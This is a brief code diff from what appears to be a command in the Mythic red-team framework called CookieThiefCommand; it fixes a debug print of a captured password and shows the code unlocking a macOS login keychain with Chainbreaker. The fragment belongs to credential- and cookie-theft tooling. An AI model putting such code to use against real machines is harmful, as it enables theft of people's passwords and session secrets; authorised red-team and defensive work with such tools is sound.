@@ -77,7 +77,8 @@ class CookieThiefCommand(CommandBase):
             sys.stdout.flush()
 
         ##DEBUG:
-        print("Password: " password)
+        print("Password: " + password)
+        sys.stdout.flush()
 
         try:
             keychain = Chainbreaker("/Mythic/mythic/tmp_login.keychain-db", unlock_password=password, unlock_key=None,
